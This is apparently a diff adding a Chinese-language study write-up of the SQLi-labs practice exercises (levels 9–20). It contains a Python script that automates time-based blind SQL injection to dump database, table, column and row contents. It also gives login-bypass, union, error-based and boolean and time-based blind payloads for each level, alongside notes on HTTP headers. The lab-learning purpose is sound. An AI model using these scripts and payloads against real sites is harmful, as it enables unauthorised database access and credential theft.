+selectTableCountPayload = "' and if((select count(table_name) from information_schema.tables where table_schema='%s')>=%d,0,sleep(0.1)) #"
+selectTableNameLengthPayloadfront = "'and if((select length(table_name) from information_schema.tables where table_schema='%s' limit "
+selectTableNameLengthPayloadbehind = ",1)>=%d,0,sleep(0.1)) #"
+
+#发送请求,根据页面的返回时间的判断长度的猜测结果
+#string:猜测的字符串;payload:使用的payload;length:猜测的长度
+def getLengthResult(payload, string, length):
+    print payload % (string, length)
+    finalUrl = url + urllib.quote(payload % (string, length))
+    s1=time.time()
+    res = urllib2.urlopen(finalUrl)
+    s2=time.time()
+    if s2-s1 < 0.08:
+        return True
+    else:
+        return False
+
+#发送请求,根据页面的返回时间的判断字符的猜测结果
+#payload:使用的payload;string:猜测的字符串;pos:猜测字符串的位置;ascii:猜测的ascii
+def getResult(payload, string, pos, ascii):
+    finalUrl = url + urllib.quote(payload % (string, pos, ascii))
+    s1 = time.time()
+    res = urllib2.urlopen(finalUrl)
+    s2 = time.time()
+    if s2 - s1 < 0.08:
+        return True
+    else:
+        return False
+
+#注入
+def inject():
+    #猜数据库长度
+    lengthOfDBName = getLengthOfString(lengthPayload, database)
+    print "length of DBname: " + str(lengthOfDBName)
+    #猜数据库名称
+    DBname = getName(asciiPayload, selectDB, lengthOfDBName)
+    print "current database:" + DBname
+    #猜数据库中的表的个数
+    tableCount = getLengthOfString(selectTableCountPayload, DBname)
+    print "count of table:" + str(tableCount)
+    for i in xrange(0, tableCount):
+        num = str(i)
+        #猜当前表的长度
+        selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind
+        tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname)
+        print "current table length:" + str(tableNameLength)
+        #猜当前表的名字
+        selectTableName = selectTable % (DBname, i)
+        tableName = getName(asciiPayload, selectTableName, tableNameLength)
+        print tableName
+    #猜指定表的列的数量
+    selectColumnCountPayload ="' and if((select count(column_name) from information_schema.columns where table_schema='" + DBname + "' and table_name='%s')>=%d,0,sleep(0.1)) #"
+    columnCount = getLengthOfString(selectColumnCountPayload, getTable)
+    print "table:" + getTable + " --count of column:" + str(columnCount)
+    #猜该表有多少行数据
+    dataCountPayload = "' and if((select count(*) from %s)>=%d,0,sleep(0.1)) #"
+    dataCount = getLengthOfString(dataCountPayload, getTable)
+    print "table:" + getTable + " --count of data: " + str(dataCount)
+    data = []
+    #获取指定表中的列
+    for i in xrange(0, columnCount):
+        #猜该列名字长度
+        selectColumnNameLengthPayload = "' and if((select length(column_name) from information_schema.columns where table_schema='" + DBname + "' and table_name='%s' limit " + str(i) + ",1)>=%d,0,sleep(0.1)) #"
+        columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable)
+        print "current column length:" + str(columnNameLength)
+        #猜该列的名字
+        selectColumn = "(select column_name from information_schema.columns where table_schema='" + DBname + "' and table_name='%s' limit %d,1)"
+        selectColumnName = selectColumn % (getTable, i)
+        columnName = getName(asciiPayload, selectColumnName, columnNameLength)
+        print columnName
+        tmpData = []
+        tmpData.append(columnName)
+        #获取该表的数据
+        for j in xrange(0, dataCount):
+            columnDataLengthPayload = "' and if((select length(" + columnName + ") from %s limit " + str(j) + ",1)>=%d,0,sleep(0.1)) #"
+            columnDataLength = getLengthOfString(columnDataLengthPayload, getTable)
+            selectData = "(select " + columnName + " from users limit " + str(j) + ",1)"
+            columnData = getName(asciiPayload, selectData, columnDataLength)
+            tmpData.append(columnData)
+        data.append(tmpData)
+        #格式化输出数据
+    tmp = ""
+    for i in xrange(0, len(data)):
+        tmp += data[i][0] + "   "
+    print tmp
+    for j in xrange(1, dataCount + 1):
+        tmp = ""
+        for i in xrange(0, len(data)):
+            tmp += data[i][j] + "   "
+        print tmp
+
+#猜长度
+def getLengthOfString(payload, string):
+    lengthLeft = 0
+    lengthRigth = 0
+    guess = 10
+    #确定长度上限,每次增加5
+    while 1:
+        if getLengthResult(payload, string, guess) == True:
+            guess = guess + 5
+        else:
+            lengthRigth = guess
+            break;
+    #二分法查长度
+    mid = (lengthLeft + lengthRigth) / 2
+    while lengthLeft < lengthRigth - 1:
+        if getLengthResult(payload, string, mid) == True:
+            lengthLeft = mid
+        else:
+            lengthRigth = mid
+        mid = (lengthLeft + lengthRigth) / 2
+    return lengthLeft
+
+#猜名字
+def getName(payload, string, lengthOfString):
+    #空格(32)是第一个可显示的字符delete(127)是最后一个可显示的字符
+    tmp = ''
+    for i in xrange(1, lengthOfString + 1):
+        left = 32
+        right = 127
+        mid = (left + right) / 2
+        while left < right - 1:
+            if getResult(payload, string, i, mid) == True:
+                left = mid
+                mid = (left + right) / 2
+            else:
+                right = mid
+            mid = (left + right) / 2
+        tmp += chr(left)
+    return tmp
+
+def main():
+    inject()
+main()
+```
+
+### less10(GET – Blind – Time based – double quotes)
+同样可以用上面的脚本，把里面的单引号改为双引号就行
+
+## SQLi-labs训练(less11-20)
+### less-11-error based-string
+首先随便测试一下`username=123' password=123`通过post传递进去，然后就报错，来看报错`'123' LIMIT 0,1'`
+那么就可以猜测后台sql语句为`select username,password from table where username='xx' and password='xx'`
+
+语句晓得了，就好搞了，拿个单引号把前面那个单引号闭合
+可以用`uname=123' or 1=1 -- &passwd=123&submit=submit`来登录绕过
+
+下面构造语句
+#### 爆数据库和版本
+`uname=123'  union select database(),version()# &passwd=123&submit=submit`
+
+#### 爆表名
+`uname=123'  union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# &passwd=123&submit=submit`
+
+
+#### 爆列名
+`uname=123'  union select 1,group_concat(column_name) from information_schema.columns where table_name='users'# &passwd=123&submit=submit`
+
+#### 最后爆数据
+`uname=123'  union select username,password from users limit 0,1# &passwd=123&submit=submit`
+
+### Less-12- Error Based- Double quotes- String
+这个跟less11差不多，只不过多加了双引号和括号，也就是说他的后台sql语句为`select username,password from table where username=(“username”) and password=(“password”)`
+所以绕过也就很简单，就是上面的单引号换成双引号和括号闭合，其他都一样
+
+### Less-13- Double Injection- String- with twist
+啥？twist是啥，打扰了英语不好，查一波才知道是`~`这个，但是，用`username=123' password=123`试,报错的是`'123') LIMIT 0,1'`
+
+那么这个后台的sql语句不就还是`select * from table where username=(‘inputuser’) and password=(‘inputpass’)`，那就用`')`
+
+### payload
+
+```
+爆数据库
+uname=123') and (select 1 from (select count(*),(concat("~",database(),"~",floor(rand()*2)))name
+from information_schema.tables group by name)b) #&passwd=&submit=Submit
+
+爆表
+uname=123') and (select 1 from (select count(*),(concat("~",(select table_name from
+information_schema.tables where table_schema=database() limit 0,1),"~",floor(rand()*2)))name
+from information_schema.tables group by name)b) #&passwd=&submit=Submit
+
+爆完
+uname=123') and (select 1 from (select count(*),(concat("~",(select username from users
+limit 0,1),"~",floor(rand()*2)))name from information_schema.tables group by name)b)
+#&passwd=&submit=Submit
+```
+
+### less-14
+跟less-13差不多，只不过把`')`改为了双引号
+`uname=123” and (select 1 from (select count(*),(concat("~",database(),"~",floor(rand()*2)))name from
+information_schema.tables group by name)b) #&passwd=&submit=Submit `
+
+### less-15-布尔盲注
+盲注，其实就是靠猜，猜ascii的值
+
+```
+猜数据库长度(前台)
+1′ or length(database())=8#
+
+然后猜库名
+uname=1' or (select ascii(substr(database(),1,1)) > 100)#&passwd=&submit=Submit
+通过返回正确或者错误，最后猜出来的ascii值在110-120之间（虽然晓得数据库名，小声bb）
+
+然后猜表名
+uname=1' or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) > 100)#&passwd=&submit=Submit
+
+
+```
+
+后面都没啥区别啦，步骤都是一样的就不多说了，最后得到用户名Dump
+
+### less-16-时间盲注
+通过前面的经历，得：前一个是单引号，那么下一个就是双引号。
+so，try：
+`uname=123”) or (sleep(1)=0)#&passwd=123&submit=Submit ` 一秒后返回正确界面,right
+然后就继续猜吧
+大致上是差不多的
+
+```
+猜数据库
+uname=") or (select if(ascii(substr(database(),1,1)) > 100,sleep(1)=0,NULL)) #&passwd=admin&submit=Submit
+
+猜表名
+uname=123") or (select if((ascii(substr((select table_name from information_schema.tables where
+table_schema=database() limit 0,1),1,1)) > 100),sleep(1)=0,0)) #&passwd=admin&submit=Submit
+
+猜字段
+uname=123") or (select if((ascii(substr((select column_name from information_schema.columns where
+table_name='users' limit 0,1),1,1)) > 100),sleep(1)=0,0)) #&passwd=admin&submit=Submit
+
+猜数据
+uname=123") or (select if((ascii(substr((select username from users limit 0,1),1,1)) > 50),sleep(1)=0,0))
+#&passwd=admin&submit=Submit
+```
+
+
+### less-17-update
+在前台测试一下，会发现会更新密码，其实感觉sql语句就很好猜了，就是很简单的update语句(其实是因为这里是page-1)，然后就可以构造payload
+
+```
+
+uname=admin&passwd=123' and (select 1 from (select count(*),(concat("~",database(),"~",floor(rand()*2)))name from information_schema.tables group by name)b) #&submit=Submit
+
+uname=admin&passwd=123' AND (select 1 from (select count(*),(concat("~",(select table_name from information_schema.tables where table_schema=database() limit 0,1),"~",floor(rand()*2)))name from information_schema.tables group by name)b)#&submit=Submit
+
+uname=admin&passwd=123' AND (select 1 from (select count(*),(concat("~",(select column_name from information_schema.columns where table_name='users' limit 0,1),"~",floor(rand()*2)))name from information_schema.tables group by name)b) #&submit=Submit
+
+uname=admin&passwd=123' AND (select 1 from (select count(*),(concat("~",(select username from users limit 0,1),"~",floor(rand()*2)))name from information_schema.tables group by name)b) #&submit=Submit
+
+```
+
+### less-18&less-19
+关于`HTTP Header`位置的注入，然后是insert类型，可以通过利用报错注入的方式获取数据。
+先说一下什么是`HTTP Header`吧
+
+### HTTP Headerrr
+HTTP大家都知道，超文本传输协议嘛，目前网页传输的的通用协议。HTTP协议采用了请求/响应模型，浏览器或其他客户端发出请求，服务器给与响应。就整个网络资源传输而言，包括message-header和message-body两部分。首先传递message- header，即http header消息 。http header 消息通常被分为4个部分：general  header, request header, response header,
+entity header。但是这种分法就理解而言，感觉界限不太明确。根据维基百科对http header内容的组织形式，大体分为Request和Response两部分。我们所要关注的就是Request部分
+
+不过由于太多了，这里只写一些常见的。
+
+| Header          |                                                         注释 |                     example                     |
+| :-------------- | -----------------------------------------------------------: | :---------------------------------------------: |
+| Accept-Encoding |          指定浏览器可以支持的web服务器返回内容压缩编码类型。 |         Accept-Encoding: compress, gzip         |
+| Cookie          | HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。 |          Cookie: $Version=1; Skin=new;          |
+| Content-Type    |                                   请求的与实体对应的MIME信息 | Content-Type: application/x-www-form-urlencoded |
+| Host            |                               指定请求的服务器的域名和端口号 |                Host: www.xxx.com                |
+| Referer         |                  先前网页的地址，当前请求网页紧随其后,即来路 |     Referer: http://www.xxx.com/index.html      |
+| User-Agent      |                       User-Agent的内容包含发出请求的用户信息 |      User-Agent: Mozilla/5.0 (Linux; X11)       |
+
+
+
+还是老规矩，前台测试一下,但是这里我遇到了一点问题，不论是用admin登录也好，还是其他也好，都无法登录，按照源码上的应该会输出`user-agent`，然后也有的说用`Tamper Data`，试了一下也没啥反应，emmm先放着吧，先过。我觉得可能是我用户名和密码有问题，网上说的用户名和密码就是admin，但是我输入admin却是`login faild`.............
+包括less-20也是，可能是玄学吧。
+
+## 参考
+
+https://www.runoob.com/mysql/mysql-tutorial.html
+
+https://www.runoob.com/sql/sql-tutorial.html
+
+https://blog.csdn.net/qq_38741971/article/details/80576110
+
+SQLi-labs
+
+https://www.xmanblog.net/category/sqli-labs/
+
+https://www.cnblogs.com/AmoBlogs/category/1186305.html
+
+<https://www.freebuf.com/articles/web/34619.html>
+
